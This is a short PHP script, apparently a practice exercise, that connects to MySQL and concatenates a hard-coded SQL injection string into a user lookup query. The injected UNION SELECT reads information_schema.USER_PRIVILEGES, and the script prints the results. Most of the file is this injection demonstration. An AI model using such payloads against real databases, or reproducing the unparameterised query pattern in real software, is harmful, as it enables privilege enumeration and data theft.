<?php

include 'datos.php';

$conn = new mysqli($servername, $username, $password, $db);
$injeccion = '\' UNION SELECT * FROM information_schema.USER_PRIVILEGES 
    UNION SELECT * FROM information_schema.USER_PRIVILEGES WHERE GRANTEE=\'';
$sql = 'SELECT * FROM users WHERE id=\''.$injeccion.'\'';

if ($result = $conn->query($sql)) {
    // echo '<table>';
    // echo '<tr>';
    // while ($header = $result->fetch_field()) {
    //     echo '<th>'.$header->name.'</th>';
    // }
    // echo '</tr>';
    while ($row = $result->fetch_row()) {
        // echo '<tr>';
        // foreach ($row as $data) {
        //     echo '<td>'.$data.'</td>';
        // }
        // echo '</tr>';
        echo $row[0] . '<br>';
    }
    // echo '</table>';
} else {
    echo 'xd';
}
